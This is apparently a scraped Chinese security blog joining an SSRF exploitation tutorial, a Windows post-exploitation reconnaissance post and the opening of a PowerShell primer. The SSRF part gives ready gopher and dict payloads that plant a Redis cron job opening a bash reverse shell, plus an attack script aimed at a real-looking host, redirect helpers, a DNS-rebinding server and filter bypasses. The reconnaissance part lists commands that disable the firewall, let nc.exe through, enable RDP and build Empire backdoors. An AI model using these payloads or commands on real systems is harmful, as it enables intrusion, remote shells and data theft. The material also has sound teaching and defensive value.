http/https：主要用来探测内网服务，根据响应的状态判断内网端口及服务，可以结合如Struts2的RCE来实现攻击； file：读取服务器上的任意文件内容； dict：除了泄露安装软件版本信息，还可以查看端口，操作内网Redis服务等； gopher：能够将所有操作转换成数据流，并将数据流一次发送出去，可以用来探测内网的所有服务的所有漏洞，可利用来攻击Redis和PHP-FPM； ftp/ftps：FTP匿名访问、爆破； tftp：UDP协议扩展，发送UDP报文； imap/imaps/pop3/smtp/smtps：爆破邮件用户名密码； telnet：SSH/Telnet匿名访问及爆破； 本地利用PHP中的curl_exec()函数导致的SSRF漏洞在CTF中是经常遇到的，该函数会执行cURL会话。 可以通过curl -V命令查看curl版本及其支持的协议类型： 可以看到，我本地kali的是支持dict、file、gopher等等协议的。因此本地利用可使用上述几个协议。 注意：Windows使用curl命令需要把单引号换成双引号。 file://协议任意读文件1curl -v &apos;file:///etc/passwd&apos; dict://协议探测端口及banner信息12curl -v &apos;dict://127.0.0.1:22&apos;curl -v &apos;dict://127.0.0.1:6379/info&apos; gopher://协议反弹shell1curl -v &apos;gopher://127.0.0.1:6379/_*3%0d%0a$3%0d%0aset%0d%0a$1%0d%0a1%0d%0a$57%0d%0a%0a%0a%0a*/1 * * * * bash -i &gt;&amp; /dev/tcp/127.0.0.1/2333 0&gt;&amp;1%0a%0a%0a%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$3%0d%0adir%0d%0a$16%0d%0a/var/spool/cron/%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$10%0d%0adbfilename%0d%0a$4%0d%0aroot%0d%0a*1%0d%0a$4%0d%0asave%0d%0a*1%0d%0a$4%0d%0aquit%0d%0a&apos; 当需要更换IP和端口时，命令中的$57需要同时更改，因为$57表示的是exp字符串长度为57个字节，上面的exp即%0a%0a%0a*/1 * * * * bash -i &gt;&amp; /dev/tcp/127.0.0.1/2333 0&gt;&amp;1%0a%0a%0a这段字符串URL解码后的长度为57。 这部分在下面的远程利用中会具体讲到。 远程利用网上找的SSRF题目代码跑下就好。远程利用分为回显型和无回显型。 s1.php，未做任何SSRF防御，且有回显： 12345678910111213141516&lt;?phpfunction curl($url)&#123; // 创建一个新cURL资源 $ch = curl_init(); // 设置URL和相应的选项 curl_setopt($ch, CURLOPT_URL, $url); curl_setopt($ch, CURLOPT_HEADER, 0); // 抓取URL并把它传递给浏览器 curl_exec($ch); // 关闭cURL资源，并且释放系统资源 curl_close($ch);&#125;$url = $_GET['url'];curl($url); ?&gt; 利用exp，比较简单，就不贴图了： 123456http://192.168.10.137/s1.php?url=file:///etc/passwdhttp://192.168.10.137/s1.php?url=dict://127.0.0.1:6379/infohttp://192.168.10.137/s1.php?url=gopher%3A%2F%2F127.0.0.1%3A6379%2F_%2A3%250d%250a%243%250d%250aset%250d%250a%241%250d%250a1%250d%250a%2456%250d%250a%250d%250a%250a%250a%2A%2F1%20%2A%20%2A%20%2A%20%2A%20bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F127.0.0.1%2F2333%200%3E%261%250a%250a%250a%250d%250a%250d%250a%250d%250a%2A4%250d%250a%246%250d%250aconfig%250d%250a%243%250d%250aset%250d%250a%243%250d%250adir%250d%250a%2416%250d%250a%2Fvar%2Fspool%2Fcron%2F%250d%250a%2A4%250d%250a%246%250d%250aconfig%250d%250a%243%250d%250aset%250d%250a%2410%250d%250adbfilename%250d%250a%244%250d%250aroot%250d%250a%2A1%250d%250a%244%250d%250asave%250d%250a%2A1%250d%250a%244%250d%250aquit%250d%250a# Windows下file://协议有点区别http://192.168.10.137/s1.php?url=file:///C:/Windows/win.ini s2.php，限制协议为HTTP/HTTPS，且设置跳转重定向为True（默认不跳转）： 123456789101112131415&lt;?phpfunction curl($url)&#123; $ch = curl_init(); curl_setopt($ch, CURLOPT_URL, $url); curl_setopt($ch, CURLOPT_FOLLOWLOCATION, True); // 限制为HTTPS、HTTP协议 curl_setopt($ch, CURLOPT_PROTOCOLS, CURLPROTO_HTTP | CURLPROTO_HTTPS); curl_setopt($ch, CURLOPT_HEADER, 0); curl_exec($ch); curl_close($ch);&#125;$url = $_GET['url'];curl($url);?&gt; 此时使用dict、gopher等协议已经不能像上一个题目一样直接同理，但是还可以利用302跳转的方式来绕过http/https协议限制。 Redis反弹ShellRedis定时任务反弹shell语句如下： 1234set 1 &quot;\\n\\n\\n*/1 * * * * bash -i &gt;&amp; /dev/tcp/127.0.0.1/2333 0&gt;&amp;1\\n\\n\\n&quot;config set dir /var/spool/cron/config set dbfilename rootsave 通过Gopher协议实现Gopher协议在SSRF利用中被广泛运用，其URL格式如下： 1gopher://&lt;host&gt;:&lt;port&gt;/&lt;gopher-path&gt;_后接TCP数据流 也就是说，通过Gopher协议，我们可以直接发送TCP协议流，从中进行urlencode编码来构造SSRF攻击代码。 具体Gopher协议报文的构造可参考Joychou的博客：https://joychou.org/web/phpssrf.html#directory0418754728965590855 通过Dict协议实现这部分引用自：SSRF漏洞分析与利用 dict协议有一个功能：dict://serverip:port/name:data 向服务器的端口请求 name data，并在末尾自动补上rn(CRLF)。也就是如果我们发出dict://serverip:port/config:set:dir:/var/spool/cron/的请求，redis就执行了config set dir /var/spool/cron/ rn.用这种方式可以一步步执行redis getshell的exp，执行完就能达到和gopher一样的效果。原理一样，但是gopher只需要一个url请求即可，dict需要步步构造。 利用猪猪侠的wooyun上公开的脚本改成适配本文的脚本ssrf.py： 12345678910111213141516171819202122232425262728293031323334353637383940414243444546import requestshost = '104.224.151.234'port = '6379'bhost = 'www.4o4notfound.org'bport=2333vul_httpurl = 'http://www.4o4notfound.org/ssrf.php?url='_location = 'http://www.4o4notfound.org/302.php'shell_location = 'http://www.4o4notfound.org/shell.php'#1 flush db_payload = '?s=dict%26ip=&#123;host&#125;%26port=&#123;port&#125;%26data=flushall'.format( host = host, port = port)exp_uri = '&#123;vul_httpurl&#125;&#123;0&#125;&#123;1&#125;'.format(_location, _payload, vul_httpurl=vul_httpurl)print exp_uriprint requests.get(exp_uri).content#set crontab command_payload = '?s=dict%26ip=&#123;host&#125;%26port=&#123;port&#125;%26bhost=&#123;bhost&#125;%26bport=&#123;bport&#125;'.format( host = host, port = port, bhost = bhost, bport = bport)exp_uri = '&#123;vul_httpurl&#125;&#123;0&#125;&#123;1&#125;'.format(shell_location, _payload, vul_httpurl=vul_httpurl)print exp_uri print requests.get(exp_uri).content#confg set dir_payload='?s=dict%26ip=&#123;host&#125;%26port=&#123;port&#125;%26data=config:set:dir:/var/spool/cron/'.format( host = host, port = port)exp_uri = '&#123;vul_httpurl&#125;&#123;0&#125;&#123;1&#125;'.format(_location, _payload, vul_httpurl=vul_httpurl)print exp_uriprint requests.get(exp_uri).content#config set dbfilename_payload='?s=dict%26ip=&#123;host&#125;%26port=&#123;port&#125;%26data=config:set:dbfilename:root'.format( host = host, port = port)exp_uri = '&#123;vul_httpurl&#125;&#123;0&#125;&#123;1&#125;'.format(_location, _payload, vul_httpurl=vul_httpurl)print exp_uriprint requests.get(exp_uri).content#save_payload='?s=dict%26ip=&#123;host&#125;%26port=&#123;port&#125;%26data=save'.format( host = host, port = port)exp_uri = '&#123;vul_httpurl&#125;&#123;0&#125;&#123;1&#125;'.format(_location, _payload, vul_httpurl=vul_httpurl)print exp_uriprint requests.get(exp_uri).content 因为curl默认不支持302跳转，而该脚本要用到302跳转，所以需要在ssrf.php中加上一行“curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1)”来支持跳转。302.php代码为： 1234567&lt;?php$ip = $_GET['ip'];$port = $_GET['port'];$scheme = $_GET['s'];$data = $_GET['data'];header(\"Location: $scheme://$ip:$port/$data\");?&gt; shell.php主要用于写入用于反弹shell的crontab的定时任务，代码为： 123456789&lt;?php$ip = $_GET['ip'];$port = $_GET['port'];$bhost = $_GET['bhost'];$bport = $_GET['bport'];$scheme = $_GET['s'];header(\"Location: $scheme://$ip:$port/set:0:\\\"\\\\x0a\\\\x0a*/1\\\\x20*\\\\x20*\\\\x20*\\\\x20*\\\\x20/bin/bash\\\\x20-i\\\\x20&amp;gt;\\\\x26\\\\x20/dev/tcp/&#123;$bhost&#125;/&#123;$bport&#125;\\\\x200&amp;gt;\\\\x261\\\\x0a\\\\x0a\\\\x0a\\\"\");?&gt; 执行ssrf.py,即可在/var/spool/cron/下写入定时任务，反弹shell，nc等待接收shell。 攻击本地PHP-FPMSSRF打本地PHP-FPM在之前的博文中有讲过：《浅谈PHP-FPM安全》 本次的Gopher协议攻击报文是直接通过脚本生成的。 0x02 SSRF in Java可利用的协议由于Java没有PHP的cURL，因此不能像PHP一样可以通过curl -V来查看支持的协议，这里我们可以使用import sun.net.www.protocol来查看支持哪些协议： 可以看到是支持file、ftp、http/https、jar、mailto、netdoc等协议的。 而实际上有攻击利用价值的仅为file和http/https协议。 SSRF相关类Java中能发起网络请求的类： HttpClient类 HttpURLConnection类 URLConnection类 URL类 OkHttp类 ImageIO类 Request类 注意：Request是对HttpClient类进行了封装的类，类似于Python的requests库。其用法简单，一行代码就能获取网页内容： 1Request.Get(url).execute().returnContent().toString(); 其中，仅支持HTTP/HTTPS协议的类（即类名或封装的类名带http）： HttpClient类 HttpURLConnection类 OkHttp类 Request类 支持sun.net.www.protocol所有协议的类： URLConnection类 URL类 ImageIO类 漏洞示例代码本部分引自：JAVA代码审计之XXE与SSRF 环境搭建可使用这个项目，这里就不演示了：https://github.com/pplsec/JavaVul/tree/master/MySSRF HttpURLConnection类1234567891011121314 //HttpURLConnection ssrf vulString url = request.getParameter(\"url\");URL u = new URL(url); URLConnection urlConnection = u.openConnection(); HttpURLConnection httpUrl = (HttpURLConnection)urlConnection; BufferedReader in = new BufferedReader(new InputStreamReader(httpUrl.getInputStream())); //发起请求,触发漏洞String inputLine; StringBuffer html = new StringBuffer(); while ((inputLine = in.readLine()) != null) &#123; html.append(inputLine); &#125; System.out.println(\"html:\" + html.toString()); in.close(); URLConnection类123456789101112//urlConnection ssrf vulString url = request.getParameter(\"url\");URL u = new URL(url);URLConnection urlConnection = u.openConnection();BufferedReader in = new BufferedReader(new InputStreamReader(urlConnection.getInputStream())); //发起请求,触发漏洞String inputLine;StringBuffer html = new StringBuffer();while ((inputLine = in.readLine()) != null) &#123; html.append(inputLine);&#125; System.out.println(\"html:\" + html.toString());in.close(); ImageIO类1234// ImageIO ssrf vulString url = request.getParameter(\"url\");URL u = new URL(url);BufferedImage img = ImageIO.read(u); // 发起请求,触发漏洞 其他类123456789101112131415161718192021// Request漏洞示例String url = request.getParameter(\"url\");return Request.Get(url).execute().returnContent().toString();//发起请求// openStream漏洞示例String url = request.getParameter(\"url\");URL u = new URL(url);inputStream = u.openStream(); //发起请求// OkHttpClient漏洞示例String url = request.getParameter(\"url\");OkHttpClient client = new OkHttpClient();com.squareup.okhttp.Request ok_http = new com.squareup.okhttp.Request.Builder().url(url).build();client.newCall(ok_http).execute(); //发起请求// HttpClients漏洞示例String url = request.getParameter(\"url\");CloseableHttpClient client = HttpClients.createDefault();HttpGet httpGet = new HttpGet(url);HttpResponse httpResponse = client.execute(httpGet); //发起请求 特有jar://协议分析jar://协议能从远程获取jar文件及解压得到其中的内容，其格式如下： 1jar:&lt;url&gt;!/&#123;entry&#125; 实例如下，!符号后面就是其需要从中解压出的文件： 1jar:http://a.com/b.jar!/file/within/the/zip jar://协议分类： Jar file（Jar包本身）：jar:http://www.foo.com/bar/baz.jar!/ Jar entry（Jar包中某个资源文件）：jar:http://www.foo.com/bar/baz.jar!/COM/foo/a.class Jar directory（Jar包中某个目录）：jar:http://www.foo.com/bar/baz.jar!/COM/foo/ 其实目前jar://协议在Java SSRF中的利用一般是获取目标jar包中的文件内容，比如某个类，其并不像其他常用的攻击协议一样能够对内网服务发起攻击。 比如下面的poc是获取目标jar包内C3P0.class文件： 1http://127.0.0.1:8080/MySSRF/ssrf2?url=jar:http://127.0.0.1/ysoserial.jar!/ysoserial/payloads/C3P0.class 这样就能看到jar包中的任何内容，如果jar包还是开发者自定义的话就会造成源码泄露，但是这个协议的利用还是很鸡肋。 Weblogic SSRF漏洞参考Vulhub的环境：https://vulhub.org/#/environments/weblogic/ssrf/ 0x03 SSRF in PythonSSRF在Python中也是一样的，漏洞点都是发起URL请求的函数的参数外部可控导致SSRf漏洞。最为经典的就是和urllib的CRLF注入漏洞的结合利用，可参考：Hack Redis via Python urllib HTTP Header Injection 0x04 URL地址过滤Bypass如今，大多数站点都对存在SSRF风险的地方的URL参数进行了过滤，但开发者的水平参差不齐，会存在一些可被绕过的场景。 @符绕过URL白名单有时候后台程序会以白名单的方式校验输入的URL参数是否为白名单中的域名或IP，但如果只校验如是否以http://a.com开头，则可以通过@符进行绕过：http://a.com@10.10.10.100 而此时实际访问的是http://10.10.10.100。 IP地址进制转换绕过通常，一些开发者会通过某些正则表达式来过滤掉内网地址，如： ^10(\\.([2][0-4]\\d|[2][5][0-5]|[01]?\\d?\\d)){3}$ ^172\\.([1][6-9]|[2]\\d|3[01])(\\.([2][0-4]\\d|[2][5][0-5]|[01]?\\d?\\d)){2}$ ^192\\.168(\\.([2][0-4]\\d|[2][5][0-5]|[01]?\\d?\\d)){2}$ 此时我们可以对IP地址进行进制转换来绕过，例如192.168.0.1这个地址可以被改写成： 8进制格式：0300.0250.0.1 16进制格式：0xC0.0xA8.0.1 16进制整数格式：0xC0A80001 10进制整数格式：3232235521（先转16进制正是格式再转回10进制整数形式） 其他特殊形式： 10.0.0.1可以写成10.1，访问改写后的IP地址时Apache会报400 Bad Request，但Nginx、MySQL等其他服务仍能正常工作； 0.0.0.0可以直接访问到本地； 通过xip.io解析到内网绕过这个就不用多介绍了，例如10.0.0.1这个内网IP地址是和以下几种形式的域名等价的： 10.0.0.1.xip.io www.10.0.0.1.xip.io mysite.10.0.0.1.xip.io foo.bar.10.0.0.1.xip.io 利用IPv6绕过 有些服务没有考虑IPv6的情况，但是内网又支持IPv6，则可以使用IPv6的本地IP如 [::] 0000::1或IPv6的内网域名来绕过过滤。 利用IDN绕过 一些网络访问工具如Curl等是支持国际化域名（Internationalized Domain Name，IDN）的，国际化域名又称特殊字符域名，是指部分或完全使用特殊的文字或字母组成的互联网域名。 在这些字符中，部分字符会在访问时做一个等价转换，例如 ⓔⓧⓐⓜⓟⓛⓔ.ⓒⓞⓜ 和 example.com 等同。利用这种方式，可以用 ① ② ③ ④ ⑤ ⑥ ⑦ ⑧ ⑨ ⑩ 等字符绕过内网限制。 利用30x跳转绕过 如果后端服务器在接收到参数后，正确的解析了URL的host，并且进行了过滤，我们这个时候可以使用跳转的方式来进行绕过。 可以使用如 http://httpbin.org/redirect-to?url=http://192.168.0.1 等服务跳转，但是由于URL中包含了192.168.0.1这种内网IP地址，可能会被正则表达式过滤掉，可以通过短地址的方式来绕过。 常用的跳转有302跳转和307跳转，区别在于307跳转会转发POST请求中的数据等，但是302跳转不会。 跳转常见的结合协议的方式： 123456789&lt;?phpheader(\"Location: file://etc/passwd\");?&gt;&lt;?phpheader(\"Location: dict://127.0.0.1:666/info\");?&gt;&lt;?phpheader(\"Location: gopher://127.0.0.1:666/_info\");?&gt; DNS RebindingDNS Rebinding可以利用于绕过SSRF以及绕过同源策略等。 这里看下利用DNS Rebinding绕过SSRF过滤URL参数的场景，有如下三种方法。 特定域名实现TTL=0一个常用的防护思路是：对于用户请求的URL参数，首先服务器端会对其进行DNS解析，然后对于DNS服务器返回的IP地址进行判断，如果在黑名单中，就禁止该次请求。 但是在整个过程中，第一次去请求DNS服务进行域名解析到第二次服务端去请求URL之间存在一个时间差，利用这个时间差，可以进行DNS重绑定攻击。 要完成DNS重绑定攻击，我们需要一个域名，并且将这个域名的解析指定到我们自己的DNS Server，在我们的可控的DNS Server上编写解析服务，设置TTL时间为0。这样就可以进行攻击了，完整的攻击流程为： 服务器端获得URL参数，进行第一次DNS解析，获得了一个非内网的IP 对于获得的IP进行判断，发现为非黑名单IP，则通过验证 服务器端对于URL进行访问，由于DNS服务器设置的TTL为0，所以再次进行DNS解析，这一次DNS服务器返回的是内网地址。 由于已经绕过验证，所以服务器端返回访问内网资源的结果。 域名绑定两条A记录四分之一的概率，当第一次解析为外网IP，第二次解析为内网IP，就会成功。 自建DNS服务器先添加一条NS记录和一条A记录： Ns记录表示这个子域名test.h0pe.site指定由ns.h0pe.site域名服务器解析，A记录表示ns.h0pe.site位置在ip地址x.x.x.x上。 在这个IP地址上搭建DNS服务器，采用Python的twisted库的name模块，核心代码如下，以root权限运行即可： 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849from twisted.internet import reactor, deferfrom twisted.names import client, dns, error, serverrecord=&#123;&#125;class DynamicResolver(object): def _doDynamicResponse(self, query): name = query.name.name if name not in record or record[name]&lt;1: ip=\"104.160.43.154\" else: ip=\"171.18.0.2\" if name not in record: record[name]=0 record[name]+=1 print name+\" ===&gt; \"+ip answer = dns.RRHeader( name=name, type=dns.A, cls=dns.IN, ttl=0, payload=dns.Record_A(address=b'%s'%ip,ttl=0) ) answers = [answer] authority = [] additional = [] return answers, authority, additional def query(self, query, timeout=None): return defer.succeed(self._doDynamicResponse(query))def main(): factory = server.DNSServerFactory( clients=[DynamicResolver(), client.Resolver(resolv='/etc/resolv.conf')] ) protocol = dns.DNSDatagramProtocol(controller=factory) reactor.listenUDP(53, protocol) reactor.run()if __name__ == '__main__': raise SystemExit(main()) 通过各种非HTTP协议在某些情况下，后台会限制协议类型，如不能使用http/https。 在前面的SSRF攻击利用中提到过很多协议，如file、dict、gopher等，可以使用这些不在限制协议名单中的协议来绕过利用，具体的还得看后台语言和环境而定。 0x05 漏洞组合拳SSRF+文件解析漏洞当某个页面存在SSRF漏洞，但限制了只能加载jpg等图片类型后缀的文件。此时可以结合如Apache解析漏洞，上传一个a.php.jpg的恶意文件，在通过SSRF漏洞来加载执行。 SSRF+CRLF注入漏洞如SSRF in Python中所说。 SSRF+XXE漏洞参考bWAPP中SSRF。 其他一些漏洞利用组合 Apache Hadoop远程命令执行 axis2-admin部署Server命令执行 Confluence SSRF counchdb WEB API远程命令执行 dict docker API远程命令执行 Elasticsearch引擎Groovy脚本命令执行 ftp / ftps（FTP爆破） glassfish任意文件读取和war文件部署间接命令执行 gopher HFS远程命令执行 http、https imap/imaps/pop3/pop3s/smtp/smtps（爆破邮件用户名密码） Java调试接口命令执行 JBOSS远程Invoker war命令执行 Jenkins Scripts接口命令执行 ldap mongodb php_fpm/fastcgi 命令执行 rtsp - smb/smbs（连接SMB） sftp ShellShock命令执行 Struts2 RCE telnet tftp（UDP协议扩展） tomcat命令执行 WebDav PUT上传任意文件 WebSphere Admin可部署war间接命令执行 zentoPMS远程命令执行 0x06 防御方法 限制协议为http/https，禁用不必要的协议； 尽量禁止30x跳转； 设置URL白名单或限制内网IP、限制请求的端口等； 统一错误信息； 对DNS Rebinding，考虑使用DNS缓存或者Host白名单； 0x07 参考SSRF in PHP Web安全学习笔记-SSRF SSRF Tips SSRF漏洞(原理&amp;绕过姿势)","tags":[{"name":"Web安全","slug":"Web安全","permalink":"https://www.mi1k7ea.com/tags/Web安全/"},{"name":"SSRF","slug":"SSRF","permalink":"https://www.mi1k7ea.com/tags/SSRF/"}]},{"title":"内网信息收集之本机信息收集","date":"2020-02-27T13:49:40.000Z","path":"2020/02/27/内网信息收集之本机信息收集/","text":"0x00 参考《内网安全攻防》笔记。 0x01 手动收集信息本机信息包括OS、权限、内网IP段、杀软、端口、服务、补丁更新频率、网络连接、共享、会话等。如果是域内主机，OS、应用软件、补丁、服务、杀软这些一般都是批量安装的。 查询网络配置信息1ipconfig /all 使用该命令可查看IP地址、DNS服务器、主机名、域名等信息： 查询操作系统及软件信息查询操作系统名称和版本信息分英文版和中文版： 123systeminfo | findstr /B /C:&quot;OS Name&quot; /C:&quot;OS Version&quot;或systeminfo | findstr /B /C:&quot;OS 名称&quot; /C:&quot;OS 版本&quot; 查看系统体系结构1echo %PROCESSOR_ARCHITECTURE% 查看安装的软件及版本、路径等利用wmic命令将结果输出到文本文件中： 1wmic product get name,version 利用PowerShell命令收集软件的版本信息（当然如果已在PowerShell终端，则直接输入双引号里的命令即可）： 1powershell &quot;Get-WmiObject -class Win32_Product |Select-Object -Property name,version&quot; 查询本机服务信息1wmic service list brief 查询进程列表1tasklist 该命令可以查看当前进程列表和进程用户，分析软件、客户端邮件、VPN和杀毒软件等进程： 如下命令查看进程信息： 1wmic process list brief 常见杀毒软件的进程如下表： 进程 软件名称 360SD.EXE 360杀毒 360TRAY.EXE 360实时保护 ZHUDONGFANGYU.EXE 360主动防御 KSAFETRAY.EXE 金山卫士 SAFEDOGUPDATECENTER.EXE 服务器安全狗 MCAFEE MCSHIELD.EXE 迈克菲杀毒软件 EGUI.EXE NOD32 AVP.EXE 卡巴斯基 AVGUARD.EXE 小红伞 BDAGENT.EXE BITDEFENDER 查询启动程序信息1wmic startup get command,caption 查询计划任务1schtasks /query /fo LIST /v 查询主机开机时间1net statistics workstation 查询用户列表1net user 通过分析本机用户列表，可以得出内网机子的命名规则，特别是个人及其的名称，可以用来推测整个域的用户命名方式。 通过以下命令获取本地管理员（通常包含域用户）信息： 1net localgroup administrators 可以看到，本地管理员有两个用户和一个组，默认Domain Admins组中为域内机器的本地管理员用户。在真实环境中，为了方便管理，会有域用户被添加为域机器的本地管理员用户。如图： 执行如下命令查看当前在线用户： 1query user || qwinsta 列出或断开本地计算机与所连接的客户端之间的会话1net session 查询端口列表1netstat -ano 查询补丁列表1systeminfo 需要注意系统的版本、位数、域、补丁信息及更新频率等。域内主机的补丁通常是批量安装的，通过查看本机补丁列表，就可以找到未打补丁的漏洞。 使用wmic命令查看安装在系统中的补丁，包括补丁的名称、描述、ID、安装时间等信息： 1wmic qfe get Caption,Description,HotFixID,InstalledOn 查询本机共享列表1net share 该命令可查看本机共享列表和可访问的域共享列表（域共享在很多时候是相同的）： 利用wmic命令查找共享列表： 1wmic share get name,path,status 查询路由表及所有可用接口的ARP缓存表12route printarp -a 查询防火墙相关配置关闭防火墙Windows Server 2003及之前的版本： 1netsh firewall set opmode disable Windows Server 2003之后的版本： 1netsh advfirewall set allprofiles state off 查看防火墙配置1netsh firewall show config 修改防火墙配置Windows Server 2003及之前的版本，允许指定程序全部连接： 1netsh firewall add allowedprogram c:\\nc.exe &quot;allow nc&quot; enable Windows Server 2003之后的版本，情况如下。 允许指定程序进入： 1netsh advfirewall firewall add rule name=&quot;pass nc&quot; dir=in action=allow program=&quot;C:\\nc.exe&quot; 允许指定程序退出： 1netsh advfirewall firewall add rule name=&quot;Allow nc&quot; dir=out action=allow program=&quot;C:\\nc.exe&quot; 允许3389端口放行： 1netsh advfirewall firewall add rule name=&quot;Remote Desktop&quot; protocol=TCP dir=in localport=3389 action=allow 自定义防火墙日志的储存位置1netsh advfirewall set currentprofile logging filename &quot;C:\\windows\\temp\\fw.log&quot; 查询代理配置情况1reg query &quot;HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Internet Settings&quot; 这里我本地是没开代理端口的： 查询并开启远程连接服务查看远程连接端口1Reg query &quot;hkey_local_machine\\system\\currentcontrolset\\control\\terminal server\\winstations\\RDP-Tcp&quot; /v portnumber 在命令行环境中执行注册表查询语句，连接的端口为0xd3d，转换后为3389： 在Windows Server 2003中开启3389端口1wmic path win32_terminalservicesetting where (__CLASS !=&quot;&quot;) call setallowtsconnections 1 在Windows Server 2008和Windows Server 2012中开启3389端口12345wmic /namespace:\\\\root\\cimv2\\terminalservices path win32_terminalservicesetting where (__CLASS !=&quot;&quot;) call setallowtsconnections 1wmic /namespace:\\\\root\\cimv2\\terminalservices path win32_tsgeneralsetting where (TerminalName=&apos;RDP-Tcp&apos;) call setuserauthenticationrequired 1reg add &quot;HKLM\\SYSTEM\\CURRENT\\CONTROLSET\\CONTROL\\TERMINAL SERVER&quot; /v fSingleSessionPerUser /t REG_DWORD /d 0 /f 0x02 自动收集信息为了简化前面手动收集信息的操作，我们可以直接创建一个脚本文件来自动完成前面的信息查询等工作。这里推荐一个使用WMIC收集目标机器信息的脚本。 WMIC（Windows Management Instrumentation Command-Line，Windows管理工具命令行）是最有用的Windows命令行工具。在默认情况下，任何版本的Windows XP的低权限用户不能访问WMIC，Windows 7以上版本的低权限用户允许访问WMIC并执行相关操作。 下载地址：http://www.fuzzysecurity.com/scripts/files/wmic_info.rar 我们可简单看下它的代码，其实就是执行一些wmic查询命令然后保存到html文件中： 1234567891011121314for /f &quot;delims=&quot; %%A in (&apos;dir /s /b %WINDIR%\\system32\\*htable.xsl&apos;) do set &quot;var=%%A&quot;wmic process get CSName,Description,ExecutablePath,ProcessId /format:&quot;%var%&quot; &gt;&gt; out.htmlwmic service get Caption,Name,PathName,ServiceType,Started,StartMode,StartName /format:&quot;%var%&quot; &gt;&gt; out.htmlwmic USERACCOUNT list full /format:&quot;%var%&quot; &gt;&gt; out.htmlwmic group list full /format:&quot;%var%&quot; &gt;&gt; out.htmlwmic nicconfig where IPEnabled=&apos;true&apos; get Caption,DefaultIPGateway,Description,DHCPEnabled,DHCPServer,IPAddress,IPSubnet,MACAddress /format:&quot;%var%&quot; &gt;&gt; out.htmlwmic volume get Label,DeviceID,DriveLetter,FileSystem,Capacity,FreeSpace /format:&quot;%var%&quot; &gt;&gt; out.htmlwmic netuse list full /format:&quot;%var%&quot; &gt;&gt; out.htmlwmic qfe get Caption,Description,HotFixID,InstalledOn /format:&quot;%var%&quot; &gt;&gt; out.htmlwmic startup get Caption,Command,Location,User /format:&quot;%var%&quot; &gt;&gt; out.htmlwmic PRODUCT get Description,InstallDate,InstallLocation,PackageCache,Vendor,Version /format:&quot;%var%&quot; &gt;&gt; out.htmlwmic os get name,version,InstallDate,LastBootUpTime,LocalDateTime,Manufacturer,RegisteredUser,ServicePackMajorVersion,SystemDirectory /format:&quot;%var%&quot; &gt;&gt; out.htmlwmic Timezone get DaylightName,Description,StandardName /format:&quot;%var%&quot; &gt;&gt; out.html 执行该脚本后，会在本地生成一个HTML文件来保存结果： 0x03 Empire下的主机信息收集Empire是针对Windows系统的后渗透神器，包括了从stager生成、提权到渗透维持的一系列功能。 官网：http://www.powershellempire.com/ 简单使用过程： 启动：./empire 查看已有监听器：listeners 删掉之前所有创建的监听器：kill all 查看已有Agents并删除：agents、remove all 使用http监听器：uselistener http 查看、设置对应选项并执行监听器：info、set Port 8080、set Host kali[ip]:8080、set Name hack、info、execute 使用usestager来生成后门：back、usestager windows/launcher_bat 查看、设置对应监听器选项并执行生成后门文件：info、set Listener hack、info、execute 生成的后门文件在/tmp目录下，拿到目标机子执行后可以取得连接shell Agents交互回连：agents、interact xxx Empire提供了用于收集主机信息的模块。输入如下命令即可查看本机用户、域组成员、密码设置时间、剪贴板内容、系统基本信息、网络适配器信息、共享信息等： 1usemodule powershell/situational_awareness/host/winenum 此外，powershell/situational_awareness/host/computerdetails模块几乎包含了系统中所有有用的信息，比如目标主机事件日志、应用程序控制策略日志，包括RDP登录信息、PowerShell脚本运行和保存的信息等。注意，该模块需要管理员权限运行。 0x04 查询当前权限查询当前权限1whoami 通过该命令，我们一般可以区分出当前用户是属于以下哪种用户： 本地普通用户 本地管理员用户 域内用户 在这三种情况下，如果当前内网中存在域，那么本地普通用户是查询不到内网域信息的，而只能查询本机相关信息，但是本机管理员用户和域内用户则可以查询域内信息。 其原理在于：域内的所有查询都是通过DC实现的（基于LDAP协议），而这个查询需要经过权限认证，所以只有域用户才拥有这个权限；当域用户执行查询命令时，会自动使用Kerberos协议进行认证，无须额外输入账号密码。 本地管理员Administrator权限可以直接提升为Ntauthority或System权限，因此在域中除了普通用户外，所有的机器都有一个机器用户（用户名是机器名加上“$”）。在本质上，机器的System用户对应的就是域里面的机器用户。所以，使用System权限可以运行域内的查询命令。 比如这里是hacker域内的testuser用户： 获取域SID1whoami /all 可以看到当前域hacker的SID为S-1-5-21-554479669-3187065311-1765148423，域用户testuser的SID为S-1-5-21-554479669-3187065311-1765148423-1105： 查询指定用户的详细信息1net user xxx /domain 输入该命令可以看到当前用户在本地组中有没有本地管理员权限，属于哪个域等。 这里看到testuser用户在本地组并没有本地管理员权限，在域中属于Domain Users组：","tags":[{"name":"渗透测试","slug":"渗透测试","permalink":"https://www.mi1k7ea.com/tags/渗透测试/"},{"name":"内网渗透","slug":"内网渗透","permalink":"https://www.mi1k7ea.com/tags/内网渗透/"}]},{"title":"内网渗透之Windows PowerShell基础","date":"2020-02-18T13:51:31.000Z","path":"2020/02/18/Windows-PowerShell基础/","text":"0x00 前言主要参考《内网安全攻防》。 更多PowerShell的内容可参考：https://www.pstips.net/powershell-online-tutorials 0x01 PowerShell基本概念Windows PowerShell是一种命令行外壳程序和脚本环境，可以看作是命令行提示符cmd.exe的扩展，其使命令行用户和脚本编写者可以利用.NET Framework的强大功能。只要可以在一台计算机上运行代码，就可以将PowerShell脚本文件（.ps1）下载到磁盘中执行（甚至无须将脚本文件写到磁盘中）。 PowerShell需要.NET环境的支持，同时支持.NET对象，其拥有以下特点： 在Windows 7以上版本是默认安装的； 脚本可以在内存中运行，不需要写入磁盘； 几乎不会触发杀毒软件； 可远程执行； 目前很多工具都是局域PowerShell开发的； 使Windows脚本的执行更为容易； cmd.exe的运行通常会被阻止，但PowerShell的运行通常不会被阻止； 可用于管理活动目录； 通过以下两个命令都可以查看PowerShell的版本： 123456789101112131415161718192021PS E:\\&gt; Get-HostName : ConsoleHostVersion : 5.1.18362.628InstanceId : 33a7b882-5b06-494a-9577-ed0f51a6e8adUI : System.Management.Automation.Internal.Host.InternalHostUserInterfaceCurrentCulture : zh-CNCurrentUICulture : zh-CNPrivateData : Microsoft.PowerShell.ConsoleHost+ConsoleColorProxyDebuggerEnabled : 